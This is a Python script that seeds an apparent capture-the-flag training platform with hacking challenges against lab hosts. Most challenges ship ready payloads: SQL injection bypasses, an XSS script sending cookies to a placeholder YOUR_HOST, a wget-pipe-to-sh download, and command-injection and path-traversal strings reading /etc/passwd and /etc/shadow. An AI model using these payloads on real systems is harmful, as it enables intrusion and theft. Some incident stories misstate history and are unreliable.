from app import app, db, Challenge, User, VMStatus
from datetime import datetime, timezone
import json
from werkzeug.security import generate_password_hash

def init_challenges():
    print("Initializing challenges...")
    
    # Clear existing data
    Challenge.query.delete()
    VMStatus.query.delete()
    
    # Sample challenges
    challenges = [
        {
            'name': 'SQL Injection - Login Bypass',
            'description': 'Classic SQL Injection in a login form allowing authentication bypass.',
            'how_to_execute': 'Follow the step-by-step execution steps listed in `execution_steps`.',
            'execution_steps': [
                'Open a browser and navigate to the target login page using the link below.',
                "Inspect the login form to confirm the POST parameters (usually 'username' and 'password').",
                "In the username field enter:  ' OR '1'='1  and enter any password (or leave blank).",
                'Submit the form and observe whether you are authenticated as a user (often the first user, e.g., admin).',
                'If the above fails, try terminating and commenting the rest of the query:  admin\'--  or  \' OR \"1\"=\"1\"--',
                'Use an intercepting proxy (Burp) to replay and modify requests, or run sqlmap to confirm and enumerate the database.',
                'Locate the flag in the profile or admin area after successful login.'
            ],
            'commands': (
                "# Manual: try payloads in the username field\n"
                "' OR '1'='1\n"
                "admin'--\n"
                "\n# Curl example to reproduce login POST:\n"
                "curl -s -X POST 'http://10.0.2.7:8080/login' -d 'username=\' OR \'1\'=\'1\'&password=test' -L\n"
                "\n# Automated testing with sqlmap (confirm first with proxy/interception):\n"
                "sqlmap -u 'http://10.0.2.7:8080/login' --data 'username=__USER__&password=__PASS__' --level=3 --risk=2 --batch"
            ),
            'tools': [
                'Browser (Chrome/Firefox) with Developer Tools',
                'Burp Suite (intercept & repeater)',
                'OWASP ZAP',
                'sqlmap (for automated confirmation)'
            ],
            'real_world_use': (
                "SQL injection is one of the most critical web vulnerabilities, responsible for numerous high-profile data breaches. "
                "In 2019, a major hotel chain suffered a breach exposing 5 million records due to SQL injection. "
                "Attackers used similar techniques to access customer data, including payment information. "
                "This vulnerability is particularly dangerous in authentication systems as it can lead to full system compromise."
            ),
            'difficulty': 'Easy',
            'category': 'Web Security',
            'target_url': 'http://10.0.2.7:8080/login',
            'points': 100,
            'vm_name': 'web-server-1',
            'target_ip': '192.168.1.10',
            'flag': 'FLAG{sql_injection_bypass_123}',
            'hints': (
                "1. The application is vulnerable to classic SQL injection in the login form\n"
                "2. The SQL query might be using an OR condition that can be manipulated\n"
                "3. Try to close the string and add a condition that's always true\n"
                "4. Remember to comment out the rest of the query if needed"
            )
        },
        {
            'name': 'Cross-Site Scripting (XSS)',
            'description': 'Reflected XSS where input is echoed without escaping, allowing JavaScript execution in victims\' browsers.',
            'how_to_execute': 'Follow the `execution_steps` below to discover and exploit reflected XSS safely.',
            'execution_steps': [
                'Locate input points that reflect user input (search boxes, URL parameters, comment fields).',
                "Submit a simple payload: <script>alert('XSS')</script> and observe if it executes (use a non-destructive payload first).",
                'If the alert appears, confirm the context (HTML body, attribute, JavaScript string) by testing variants like <img src=x onerror=alert(1)> or \"\'\">\'">\".',
                'To exfiltrate an admin cookie in the lab, host a simple listener (e.g., netcat or a public XSS collector) and use a safe payload to send cookies: new Image().src="http://YOUR_HOST/collect?c="+document.cookie',
                'Use Burp to intercept and replay payloads, and encode/obfuscate payloads if filters exist (HTML entities, URL encoding).',
                'After successful exfiltration, retrieve the flag value from captured requests or the admin cookie as specified in the challenge. '
            ],
            'commands': (
                "# Non-destructive test payloads to try in input fields:\n"
                "<script>alert('XSS')</script>\n"
                "<img src=x onerror=alert(1)>\n"
                "<svg/onload=alert(1)>\n"
                "\n# Example: send cookie to your collector (replace YOUR_HOST):\n"
                "<script>new Image().src='http://YOUR_HOST/collect?c='+encodeURIComponent(document.cookie)</script>\n"
                "\n# Use Burp Repeater to refine payloads and bypass simple filters."
            ),
            'tools': [
                'Browser Developer Tools',
                'Burp Suite (Repeater, Intruder)',
                'OWASP ZAP',
                'Local HTTP collector (netcat, simple HTTP server)'
            ],
            'real_world_use': (
                "XSS is commonly exploited in phishing attacks and session hijacking. In 2018, British Airways suffered an XSS attack "
                "that compromised 380,000 payment cards. Attackers injected malicious JavaScript that stole payment information "
                "from the airline's payment form. XSS vulnerabilities are particularly dangerous because they can be used to target "
                "multiple users and can be combined with other attacks for more severe impact."
            ),
            'difficulty': 'Medium',
            'category': 'Web Security',
            'points': 150,
            'vm_name': 'web-server-2',
            'target_ip': '192.168.1.11',
            'flag': 'FLAG{xss_reflected_456}',
            'target_url': 'http://10.0.2.7:8080/search',
            'hints': (
                "1. Look for search fields, comment sections, or URL parameters that reflect input\n"
                "2. The application doesn't properly encode special characters in the response\n"
                "3. Try different event handlers: onmouseover, onerror, onload\n"
                "4. The flag is in an admin-only cookie that you need to steal"
            )
        },
        {
            'name': 'Network Traffic Analysis',
            'description': 'Analyze a provided packet capture (pcap) to find hidden credentials or a flag.',
            'how_to_execute': 'Open the pcap in Wireshark or tshark and follow the guided `execution_steps`.',
            'execution_steps': [
                'Download the pcap file from the challenge page to your analysis workstation.',
                'Open the pcap in Wireshark: File → Open → select the pcap.',
                'Start with protocol filters: apply `http` or `tcp` to narrow traffic.',
                'Use "Follow → TCP Stream" on interesting TCP conversations to reconstruct requests/responses.',
                'Check known plaintext protocols (FTP, SMTP, IMAP, HTTP) for credentials or file transfer contents.',
                'Search for strings: use "Find Packet" → String to search for keywords like "flag", "password", "Authorization".',
                'If data is encoded (base64), extract and decode it locally to reveal the flag.'
            ],
            'commands': (
                "# Quick tshark commands (replace capture.pcap):\n"
                "tshark -r capture.pcap -Y http -T fields -e http.host -e http.request.uri\n"
                "tshark -r capture.pcap -T fields -e frame.number -e ip.src -e ip.dst -e data.text | sed -n '1,200p'\n"
                "\n# Extract a TCP stream as raw data (Wireshark GUI: Export Selected Packet Bytes) or use tcpflow/tshark."
            ),
            'tools': [
                'Wireshark',
                'tshark',
                'tcpflow',
                'strings + base64 (for quick decoding)'
            ],
            'real_world_use': (
                "Network traffic analysis is fundamental in cybersecurity for detecting intrusions, investigating incidents, "
                "and monitoring network health. In 2013, Target suffered a massive data breach where attackers gained access "
                "to 40 million credit card numbers. Network traffic analysis could have detected the exfiltration of this data. "
                "Security analysts use these same techniques to identify compromised systems and understand attack patterns."
            ),
            'difficulty': 'Medium',
            'category': 'Network Security',
            'points': 200,
            'vm_name': 'network-monitor',
            'target_ip': '192.168.1.20',
            'flag': 'FLAG{packet_analysis_789}',
            'target_url': 'http://10.0.2.7:8080',
            'hints': (
                "1. Look for HTTP traffic first as it's often in plaintext\n"
                "2. Check for file uploads/downloads in the traffic\n"
                "3. Some protocols like FTP and Telnet send credentials in plaintext\n"
                "4. The flag might be base64 encoded within a packet"
            )
        },
        {
            'name': 'Password Cracking',
            'description': 'Crack provided password hash(es) by identifying the hash type and using appropriate cracking techniques.',
            'how_to_execute': 'Perform reconnaissance on the hash, select attack mode and wordlists, then run a cracking tool.',
            'execution_steps': [
                'Obtain the hash string(s) provided by the challenge and save them to `hashes.txt`.',
                'Identify the hash type: run `hashid <hash>` or `python3 -m hashID`.',
                'Choose an attack strategy: dictionary (rockyou), rule-based, or brute force depending on complexity.',
                'Run Hashcat with the correct mode (e.g., -m 0 for MD5, -m 1000 for NTLM): `hashcat -m <mode> -a 0 hashes.txt rockyou.txt --status --status-timer=10`.',
                'If dictionary fails, try rule-based or combinator attacks; adjust mask/brute-force length carefully to avoid long runs.',
                'When a password is recovered, use it to retrieve the flag as instructed by the challenge (login, decrypt file, etc.).'
            ],
            'commands': (
                "# Identify hash type:\n"
                "hashid $(head -n1 hashes.txt)\n"
                "\n# Example Hashcat dictionary attack (replace MODE):\n"
                "hashcat -m MODE -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --potfile-path=cracked.pot --status\n"
                "\n# John the Ripper example:\n"
                "john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt\n"
            ),
            'tools': [
                'Hashcat',
                'John the Ripper',
                'hashid (or hash-identifier)',
                'wordlists (rockyou, SecLists)'
            ],
            'real_world_use': (
                "Password cracking is essential for security professionals during penetration tests and forensic investigations. "
                "In 2012, LinkedIn suffered a breach where 6.5 million hashed passwords were leaked. Many were quickly cracked "
                "because they used weak hashing (SHA-1 without salting). This incident highlighted the importance of strong "
                "password hashing algorithms like bcrypt or Argon2. Security teams use these same techniques to test password "
                "policies and ensure they can resist real-world attacks."
            ),
            'difficulty': 'Hard',
            'category': 'Cryptography',
            'points': 250,
            'vm_name': 'cracking-station',
            'target_ip': '192.168.1.30',
            'flag': 'FLAG{password_cracked_101}',
            'hints': (
                "1. The hash is a common type used in Linux systems\n"
                "2. Try the rockyou.txt wordlist first\n"
                "3. The password might be a common word with simple substitutions (e.g., p@ssw0rd)\n"
                "4. Check for password reuse across different systems"
            )
        },
        {
            'name': 'Privilege Escalation',
            'description': 'Gain elevated privileges on a Linux VM by enumerating misconfigurations or vulnerable services.',
            'how_to_execute': 'Follow systematic enumeration in `execution_steps` to identify escalation vectors and exploit them.',
            'execution_steps': [
                'Access the target VM (SSH or console) with the provided user credentials.',
                'Run basic enumeration: `id`, `uname -a`, `hostname`, `cat /etc/os-release`.',
                "Collect system info and set up a workspace: `mkdir /tmp/enum && cd /tmp/enum`.",
                'Enumerate SUID/SGID binaries: `find / -perm -4000 -type f 2>/dev/null` and check each binary for exploitability.',
                'Check sudo permissions: `sudo -l` to see allowed commands that can be abused.',
                "Look for writable files in important locations (`find / -writable -type f 2>/dev/null`) and misconfigured cron jobs (`ls -la /etc/cron*` and `crontab -l`).",
                'Use automated enumeration scripts (LinPEAS, LinEnum) to highlight likely vectors, then manually verify and exploit the highest-confidence findings.',
                'Once you obtain root, read `/root/flag.txt` to retrieve the flag.'
            ],
            'commands': (
                "# Basic reconnaissance:\n"
                "id; uname -a; cat /etc/os-release\n"
                "\n# Find SUID binaries:\n"
                "find / -perm -4000 -type f 2>/dev/null | sort -u\n"
                "\n# Check sudo rights for current user:\n"
                "sudo -l\n"
                "\n# Run LinPEAS (if available):\n"
                "wget -qO- https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n"
            ),
            'tools': [
                'LinPEAS / LinEnum',
                'GTFOBins (reference)',
                'Burp/Metasploit (if network services present)',
                'Manual shell enumeration commands'
            ],
            'real_world_use': (
                "Privilege escalation is a critical phase in penetration testing and red team operations. In 2016, the "
                "Dyn DNS provider was taken down by a massive DDoS attack using the Mirai botnet. The attackers gained "
                "initial access through default credentials and then escalated privileges using known vulnerabilities. "
                "This incident demonstrated how privilege escalation can turn a minor vulnerability into a full system compromise. "
                "Security professionals use these same techniques to identify and remediate security weaknesses before attackers can exploit them."
            ),
            'difficulty': 'Hard',
            'category': 'System Security',
            'points': 300,
            'vm_name': 'linux-server',
            'target_ip': '192.168.1.40',
            'flag': 'FLAG{root_escalation_202}',
            'hints': (
                "1. Always check sudo -l to see what commands you can run as root\n"
                "2. Look for world-writable files in /etc/init.d/ or other system directories\n"
                "3. Check for cron jobs that run as root and are writable\n"
                "4. The system might have an outdated kernel or services with known exploits"
            )
        },
        {
            'name': 'Forensics - File Recovery',
            'description': 'Recover deleted or hidden files from a provided disk image to locate the flag.',
            'how_to_execute': 'Mount or analyze the disk image and run targeted recovery steps listed in `execution_steps`.',
            'execution_steps': [
                'Copy the disk image to your analysis machine: `scp user@host:/path/disk.img ./` or download from the challenge page.',
                'Do not modify the original image; work on a copy: `cp disk.img work-disk.img`.',
                'Run `file work-disk.img` to identify image type and partitions.',
                'If partitions are present, use `fdisk -l work-disk.img` or `mmls` (Sleuth Kit) to find offsets and mount the partition read-only.',
                'Use `foremost -i work-disk.img -o recover/` or `scalpel` to carve files by signature into an output folder.',
                'Search recovered files for the flag: `grep -R "FLAG" recover/ -n` and inspect likely candidates.',
                'If carving fails, use `strings work-disk.img | grep -i FLAG` and review extracted strings for clues.'
            ],
            'commands': (
                "# Work on a copy:\n"
                "cp disk.img working.img\n"
                "\n# Identify partitions (Sleuth Kit mmls):\n"
                "mmls working.img\n"
                "\n# Recover files with foremost:\n"
                "foremost -i working.img -o recovered_foremost\n"
                "\n# Quick search for flags:\n"
                "grep -R --line-number -i 'FLAG' recovered_foremost || strings working.img | grep -i 'FLAG' -n\n"
            ),
            'tools': [
                'Foremost / Scalpel',
                'Sleuth Kit (mmls, fls, icat)',
                'Autopsy (GUI)',
                'strings, grep, binwalk'
            ],
            'real_world_use': (
                "File recovery is crucial in digital forensics for incident response and criminal investigations. In the 2016 "
                "Panama Papers leak, forensic investigators recovered millions of deleted files that revealed global financial "
                "secrets. Similarly, in corporate investigations, forensic analysts often recover deleted files that contain "
                "evidence of data exfiltration or intellectual property theft. These techniques are also used in data recovery "
                "scenarios where important files have been accidentally deleted."
            ),
            'difficulty': 'Medium',
            'category': 'Digital Forensics',
            'points': 175,
            'vm_name': 'forensics-pc',
            'target_ip': '192.168.1.50',
            'flag': 'FLAG{recovered_file_303}',
            'hints': (
                "1. Look for file signatures (magic numbers) at the beginning of files\n"
                "2. Common file headers: \"\x89PNG\" for PNG, \"\xff\xd8\" for JPEG, \"PK\x03\x04\" for ZIP\n"
                "3. The flag might be in the slack space or unallocated space\n"
                "4. Check file metadata and timestamps for clues"
            )
        },
        {
            'name': 'Reverse Engineering',
            'description': 'Analyze a binary to find the validation logic or secret that reveals the flag.',
            'how_to_execute': 'Disassemble and debug the binary following the `execution_steps` to locate the flag or password.',
            'execution_steps': [
                'Download the challenge binary and make it executable: `chmod +x challenge`.',
                'Check file type and architecture: `file challenge`.',
                'Extract readable strings: `strings challenge | less` to find obvious hints (e.g., format strings, file paths).',
                'Load the binary in a disassembler (Ghidra/IDA) and locate `main` or the input handling routine.',
                'Identify comparison routines used for password checks and either patch the binary, bypass the check, or run it under a debugger to force the success path.',
                'If dynamic analysis is easier, run under GDB and set breakpoints at suspicious functions to inspect variables and registers.',
                'Once you trigger the success condition (correct input or patched check), retrieve the flag output or file location.'
            ],
            'commands': (
                "# Quick local checks:\n"
                "file challenge\n"
                "strings challenge | grep -i flag -n\n"
                "\n# Run under GDB:\n"
                "gdb --args ./challenge\n"
                "(gdb) break main\n"
                "(gdb) run\n"
                "\n# Use Ghidra/IDA for deeper static analysis."
            ),
            'tools': [
                'Ghidra / IDA Pro / Binary Ninja',
                'GDB with GEF or PEDA',
                'objdump, strings, ltrace/strace'
            ],
            'real_world_use': (
                "Reverse engineering is essential for malware analysis, vulnerability research, and security assessments. "
                "In 2010, the Stuxnet worm was discovered targeting industrial control systems. Reverse engineers analyzed "
                "the malware to understand its purpose and capabilities, revealing it was designed to sabotage Iran's nuclear "
                "program. Security researchers use these same techniques to analyze malicious software, find vulnerabilities "
                "in proprietary software, and verify the security of critical systems."
            ),
            'difficulty': 'Hard',
            'category': 'Reverse Engineering',
            'points': 275,
            'vm_name': 'reversing-lab',
            'target_ip': '192.168.1.60',
            'flag': 'FLAG{reverse_engineering_404}',
            'hints': (
                "1. Look for string comparisons (strcmp) in the disassembly\n"
                "2. The password might be hardcoded as a string in the binary\n"
                "3. Use a debugger to analyze the program's behavior at runtime\n"
                "4. The program might perform simple transformations on the input"
            )
        },
        {
            'name': 'Web Application Firewall Bypass',
            'description': 'Bypass a WAF to deliver a payload (commonly XSS) by analyzing filters and encoding payloads appropriately.',
            'how_to_execute': 'Systematically probe filters and iterate payloads as listed in `execution_steps`.',
            'execution_steps': [
                'Identify the entry point protected by the WAF (form field, header, URL parameter).',
                'Use `wafw00f` or Burp to fingerprint the WAF and understand common rules.',
                'Start with benign variants (case changes, spacing, encoded characters) to see which characters are blocked.',
                'Use obfuscation techniques: HTML entity encoding, URL encoding, concatenation, or tag variations (e.g., <img src=x onerror=>).',
                'Test payloads via Burp Repeater and observe server responses and any blocking behavior.',
                'When a payload bypasses the WAF, use it to exfiltrate the admin cookie or otherwise trigger the flag disclosure.',
                'Document the final bypass payload and method for remediation notes.'
            ],
            'commands': (
                "# Fingerprint the WAF:\n"
                "wafw00f http://192.168.1.70/\n"
                "\n# Example payloads to test (modify contextually):\n"
                "<ScRiPt>alert(1)</ScRiPt>\n"
                "%3Cscript%3Ealert(1)%3C%2Fscript%3E  # URL encoded\n"
                "<img src=x onerror=alert(1)>\n"
                "\n# Use Burp Repeater to iterate quickly on payloads."
            ),
            'tools': [
                'Burp Suite',
                'wafw00f',
                'OWASP ZAP',
                'Browser Developer Tools'
            ],
            'real_world_use': (
                "WAF bypass techniques are crucial for security professionals testing the effectiveness of web application security. "
                "In 2019, a vulnerability in a popular WAF allowed attackers to bypass security filters and perform SQL injection "
                "attacks. Similarly, in 2020, security researchers discovered a technique to bypass Cloudflare's WAF using Unicode "
                "normalization. These bypass techniques help organizations strengthen their security posture by identifying and "
                "addressing weaknesses in their WAF configurations."
            ),
            'difficulty': 'Hard',
            'category': 'Web Security',
            'points': 225,
            'vm_name': 'waf-server',
            'target_ip': '192.168.1.70',
            'flag': 'FLAG{waf_bypassed_505}',
            'hints': (
                "1. The WAF blocks common XSS payloads but has blind spots\n"
                "2. Try different HTML event handlers: onmouseover, onerror, onload\n"
                "3. The WAF might not normalize input consistently\n"
                "4. The flag is in an admin cookie that you need to exfiltrate"
            )
        },
        {
            'name': 'Command Injection',
            'description': 'Inject system commands through user input in a vulnerable application to execute arbitrary code and retrieve the flag.',
            'how_to_execute': 'Use special shell characters to break out of the intended command and execute your own commands.',
            'execution_steps': [
                'Open the target application at the provided URL.',
                'Locate an input field that accepts user input (e.g., hostname, filename, username).',
                'Try injecting special characters: ; | && || ` $ ()',
                'If the application executes your injected command, you\'ve found a command injection vulnerability.',
                'Use payloads like `whoami`, `id`, `cat /etc/passwd` to test execution.',
                'Once confirmed, use `ls`, `find`, or `grep` to locate the flag file.',
                'Read the flag file with `cat` or similar commands.'
            ],
            'commands': (
                "# Test command injection in input fields\n"
                "localhost; whoami\n"
                "localhost && id\n"
                "localhost | cat /etc/passwd\n"
                "localhost || echo 'Command Injection'\n"
                "localhost `id`\n"
                "localhost $(whoami)\n"
                "\n# Once confirmed, find and read the flag:\n"
                "find / -name '*flag*' 2>/dev/null\n"
                "cat /tmp/flag.txt\n"
            ),
            'tools': [
                'Browser',
                'Burp Suite',
                'curl or wget',
                'echo (for constructing payloads)'
            ],
            'real_world_use': (
                "Command injection vulnerabilities are critical and have been exploited in numerous attacks. In 2019, researchers "
                "discovered command injection in popular IoT devices and network equipment, allowing remote code execution. "
                "The Bash vulnerability (ShellShock) in 2014 exploited command injection in CGI scripts, affecting millions of servers. "
                "Security teams use these same techniques to identify injection points and prevent unauthorized system access."
            ),
            'difficulty': 'Medium',
            'category': 'Web Security',
            'points': 175,
            'vm_name': 'web-server-3',
            'target_ip': '192.168.1.30',
            'flag': 'FLAG{command_injection_789}',
            'target_url': 'http://10.0.2.7:8080/ping',
            'hints': (
                "1. Try entering `; id` at the end of normal input\n"
                "2. Use pipe (|) to chain commands: `localhost | whoami`\n"
                "3. Try command substitution with backticks or $()\n"
                "4. The flag file might be in /tmp or the home directory"
            )
        },
        {
            'name': 'Path Traversal - Local File Inclusion',
            'description': 'Exploit path traversal vulnerability to access files outside the intended directory and retrieve sensitive information including the flag.',
            'how_to_execute': 'Use directory traversal sequences to navigate the file system and read protected files.',
            'execution_steps': [
                'Open the target application file viewer or download functionality.',
                'Try accessing files outside the intended directory using ../ sequences.',
                'Test payloads like ../../../etc/passwd to escape the intended directory.',
                'If successful, you can read sensitive files like configuration files, source code, or password files.',
                'Use variations like ../, backslash variations, or Unicode encoding if basic traversal is blocked.',
                'Locate and read the flag file (might be in /tmp, /home, or application root).',
                'Some systems might have the flag in predictable locations like /flag, /var/www/flag, etc.'
            ],
            'commands': (
                "# Basic path traversal payloads\n"
                "../../../etc/passwd\n"
                "....//....//....//etc/shadow (alternative encoding)\n"
                "%2e%2e%2f%2e%2e%2fetc%2fpasswd  # URL encoded\n"
                "/etc/hostname\n"
                "/tmp/flag.txt\n"
                "\n# When used in URL:\n"
                "?file=../../../etc/passwd\n"
                "?page=../../etc/shadow\n"
            ),
            'tools': [
                'Browser',
                'Burp Suite',
                'curl',
                'strings (for analyzing binary files)'
            ],
            'real_world_use': (
                "Path traversal (directory traversal) is a common vulnerability that allows attackers to read arbitrary files. "
                "In 2020, researchers found path traversal in multiple web frameworks allowing access to source code and configuration files. "
                "In 2018, CVE-2018-7602 in Drupal used path traversal to achieve remote code execution. These vulnerabilities often lead to "
                "information disclosure, privilege escalation, and complete system compromise if configuration files are exposed."
            ),
            'difficulty': 'Easy',
            'category': 'Web Security',
            'points': 150,
            'vm_name': 'web-server-4',
            'target_ip': '192.168.1.40',
            'flag': 'FLAG{path_traversal_234}',
            'target_url': 'http://10.0.2.7:8080/files',
            'hints': (
                "1. Try entering ../../../etc/passwd in the filename field\n"
                "2. The application might strip ../ so try ....// or double encoding\n"
                "3. Test accessing /etc/hostname to confirm the vulnerability works\n"
                "4. The flag might be in /tmp or a custom directory"
            )
        },
        {
            'name': 'Authentication Bypass - API Exploitation',
            'description': 'Bypass authentication in an API endpoint using SQL injection or weak authentication logic to access admin functionality and retrieve the flag.',
            'how_to_execute': 'Exploit weak authentication checks in API endpoints to gain unauthorized access.',
            'execution_steps': [
                'Identify the API endpoint that handles authentication (typically /api/login or /login).',
                'Test for SQL injection in the username/password fields using `\' OR \'1\'=\'1`.',
                'Try sending requests with JSON payloads to the API endpoint.',
                'Monitor the API response for tokens, session cookies, or direct flag disclosure.',
                'If SQL injection fails, try boolean-based blind attacks or timing-based attacks.',
                'Use tools like SQLMap to automate testing: `sqlmap -u http://target/api/login --data={"username":"test"}...`',
                'Once authenticated, access admin areas or protected resources to find the flag.'
            ],
            'commands': (
                "# Test basic SQL injection\n"
                "curl -X POST 'http://10.0.2.7:8080/api/login' \\\n"
                "  -H 'Content-Type: application/json' \\\n"
                "  -d '{\"username\":\"\\' OR \\\"1\\\"=\\\"1\",\"password\":\"test\"}'\n"
                "\n# URL-encoded variant\n"
                "curl -X POST 'http://10.0.2.7:8080/api/login' \\\n"
                "  -d 'username=\\' OR \\'1\\'=\\'1&password=test'\n"
                "\n# Using Burp Repeater or SQLMap:\n"
                "sqlmap -u 'http://10.0.2.7:8080/api/login' --data 'username=test&password=test' --batch\n"
            ),
            'tools': [
                'curl or Postman',
                'Burp Suite',
                'SQLMap',
                'OWASP ZAP'
            ],
            'real_world_use': (
                "API authentication bypass vulnerabilities have led to major breaches. In 2019, a simple authentication bypass in an API "
                "allowed attackers to access user data across multiple applications. The OWASP Top 10 consistently ranks broken authentication "
                "and API vulnerabilities as critical. Many companies have faced data breaches due to weak or missing API authentication checks. "
                "Security teams regularly test APIs for authentication and authorization flaws to prevent unauthorized access."
            ),
            'difficulty': 'Medium',
            'category': 'Web Security / API Security',
            'points': 200,
            'vm_name': 'api-server',
            'target_ip': '192.168.1.50',
            'flag': 'FLAG{auth_bypass_success_789}',
            'target_url': 'http://10.0.2.7:8080/auth-challenge',
            'hints': (
                "1. The API endpoint is vulnerable to SQL injection in the authentication check\n"
                "2. Try the payload: `\\' OR \\'1\\'=\\'1` in the username field\n"
                "3. Admin account credentials might be returned in the JSON response\n"
                "4. The flag is in the admin user response after successful bypass"
            )
        },
        {
            'name': 'SSH Brute Force',
            'description': 'Perform a controlled password-spraying attack against an SSH service to discover valid credentials (within lab limits).',
            'how_to_execute': 'Use careful, rate-limited attacks following `execution_steps` to avoid lockouts and noisy behavior.',
            'execution_steps': [
                'Confirm SSH is reachable: `nmap -p 22 192.168.1.80`.',
                'Compile a small list of likely usernames and passwords (do not use large noisy lists in shared environments).',
                'Run a rate-limited attacker (Hydra or Ncrack) with a small username/password set and low parallelism.',
                'If valid credentials are found, SSH into the host: `ssh user@192.168.1.80` and search the user\'s home for the flag (`ls -la; cat ~/flag.txt`).',
                'If necessary, perform post-auth enumeration and privilege escalation to reach the flag.'
            ],
            'commands': (
                "# Quick reachability test:\n"
                "nmap -p 22 192.168.1.80\n"
                "\n# Hydra example (rate-limited):\n"
                "hydra -L users.txt -P passwords.txt -t 4 -w 5 ssh://192.168.1.80\n"
                "\n# Ncrack example:\n"
                "ncrack -u users.txt -p passwords.txt 192.168.1.80:22\n"
            ),
            'tools': [
                'nmap',
                'Hydra',
                'Ncrack',
                'Patator'
            ],
            'real_world_use': (
                "SSH brute force attacks are commonly used by attackers to gain initial access to systems. In 2020, a large-scale "
                "SSH brute force campaign targeted Linux servers running Redis, Docker, and other services. The attackers used "
                "compromised credentials to deploy cryptocurrency miners. Defenders use these same techniques to test password "
                "policies and identify weak credentials before attackers can exploit them. Proper SSH hardening, including "
                "disabling password authentication in favor of key-based authentication, can prevent these attacks."
            ),
            'difficulty': 'Medium',
            'category': 'Network Security',
            'points': 175,
            'vm_name': 'ssh-server',
            'target_ip': '192.168.1.80',
            'flag': 'FLAG{ssh_access_granted_606}',
            'hints': (
                "1. Try common usernames: root, admin, user, ubuntu, ec2-user\n"
                "2. Common passwords include: password, admin, 123456, letmein\n"
                "3. The system might have rate limiting, so adjust your tool's timing\n"
                "4. Check for default credentials for common services"
            )
        },
        {
            'name': 'Buffer Overflow',
            'description': 'Exploit a buffer overflow in a network service to achieve code execution and capture a reverse shell to obtain the flag.',
            'how_to_execute': 'Use careful fuzzing, determine offsets, and build a reliable exploit following `execution_steps`.',
            'execution_steps': [
                'Confirm service is reachable and note the port: `nmap -sV -p <port> 192.168.1.90`.',
                'Fuzz the input with incremental payloads to cause a crash (use AFL, boofuzz, or simple scripts).',
                'When a crash occurs, generate a cyclic pattern and find the offset to EIP/RIP (pwntools pattern_create/pattern_offset).',
                'Identify protections (ASLR, NX, PIE, stack canaries) with checksec and adapt approach (ROP, ret2libc, or bypass canaries).',
                'Craft payload: padding + overwritten return address + ROP chain or shellcode; test locally and via the network service.',
                'On success, establish a stable reverse shell and read the flag file (e.g., /home/user/flag.txt).'
            ],
            'commands': (
                "# Example: send long string to service to observe crash (replace target/port):\n"
                "python -c \"print('A'*1000)\" | nc 192.168.1.90 9999\n"
                "\n# Use pwntools to create pattern and find offset in a debugger:\n"
                "from pwn import *\n"
                "print(cyclic(2000))\n"
                "\n# Check protections locally:\n"
                "checksec --file=./vulnerable_binary\n"
            ),
            'tools': [
                'GDB with GEF/PEDA',
                'Pwntools',
                'checksec',
                'ROPgadget / ropper',
                'msfvenom (shellcode)'
            ],
            'real_world_use': (
                "Buffer overflow vulnerabilities have been responsible for some of the most devastating cyber attacks in history. "
                "The 2014 Heartbleed bug in OpenSSL was a buffer over-read vulnerability that exposed sensitive data from "
                "millions of servers. The 2003 SQL Slammer worm exploited a buffer overflow in Microsoft SQL Server, causing "
                "widespread internet disruption. Modern exploit mitigation techniques like ASLR, DEP, and stack canaries have "
                "made these attacks more difficult but not impossible. Security researchers continue to find and responsibly "
                "disclose buffer overflow vulnerabilities to help improve software security."
            ),
            'difficulty': 'Expert',
            'category': 'Exploit Development',
            'points': 400,
            'vm_name': 'vuln-server',
            'target_ip': '192.168.1.90',
            'flag': 'FLAG{shell_obtained_707}',
            'hints': (
                "1. Use pattern_create and pattern_offset to find the exact offset to EIP\n"
                "2. Check for bad characters that might terminate your shellcode early\n"
                "3. The system might have NX enabled, requiring ROP or return-to-libc techniques\n"
                "4. The flag is in a file called flag.txt in the home directory"
            )
        },
        {
            'name': 'Command Injection',
            'description': 'Inject system commands through user input to execute arbitrary code on the server.',
            'how_to_execute': 'Follow the `execution_steps` to discover the injection point and execute commands.',
            'execution_steps': [
                'Identify input fields that might interact with system commands (ping, traceroute, DNS lookup, etc).',
                'Test basic command injection using separators like ; && | or backticks.',
                'If the application echoes command output, you can see the results directly on the page.',
                'For blind command injection, use time-based techniques: sleep 5 in the payload and observe response time.',
                'Once confirmed, enumerate the system: whoami, id, uname -a, cat /etc/passwd.',
                'Locate and read the flag file or environment variable containing the flag.'
            ],
            'commands': (
                "# Common command injection payloads:\n"
                "127.0.0.1; whoami\n"
                "127.0.0.1 && id\n"
                "127.0.0.1 | cat /etc/passwd\n"
                "127.0.0.1`whoami`\n"
                "\n# Time-based detection (blind injection):\n"
                "127.0.0.1 && sleep 5\n"
            ),
            'tools': [
                'Browser with Developer Tools',
                'Burp Suite Repeater',
                'curl / wget'
            ],
            'real_world_use': (
                "Command injection vulnerabilities have been used in major attacks like the 2017 Equifax breach "
                "where Apache Struts remote code execution allowed attackers to execute arbitrary commands. "
                "This led to the compromise of 147 million records containing SSNs and personal information. "
                "Command injection is critical because it gives attackers direct system access."
            ),
            'difficulty': 'Medium',
            'category': 'Web Security',
            'points': 150,
            'vm_name': 'web-server-3',
            'target_ip': '192.168.1.12',
            'flag': 'FLAG{command_injection_789}',
            'target_url': 'http://10.0.2.7:8080/ping',
            'hints': (
                "1. Look for ping, DNS, or network-related functions\n"
                "2. Try using pipe | to chain commands\n"
                "3. The application executes your input through a shell\n"
                "4. Output from your injected commands appears on the page"
            )
        },
        {
            'name': 'Path Traversal',
            'description': 'Access files outside the intended directory by manipulating file paths with directory traversal sequences.',
            'how_to_execute': 'Identify the file parameter and use traversal sequences to escape the intended directory.',
            'execution_steps': [
                'Locate file download or view endpoints (file=, download=, path= parameters).',
                'Test with normal filenames to understand the expected structure.',
                'Try directory traversal: ../../../etc/passwd to escape the restricted directory.',
                'If ../ is filtered, try variations: ..%2F, ....// (double encoding), or URL encoding.',
                'Attempt absolute paths if available: /etc/passwd or /etc/shadow.',
                'Once successful, read sensitive files: /etc/passwd, /proc/self/environ (environment variables with flags).',
                'Some configurations might show error messages revealing the file system structure.'
            ],
            'commands': (
                "# Common path traversal payloads:\n"
                "../../../etc/passwd\n"
                "....//....//etc/shadow\n"
                "/etc/hostname\n"
                "/proc/self/environ\n"
                "\n# URL encoded variants:\n"
                "..%2F..%2F..%2Fetc%2Fpasswd\n"
            ),
            'tools': [
                'Browser Developer Tools',
                'curl / wget with -G for parameters',
                'Burp Suite'
            ],
            'real_world_use': (
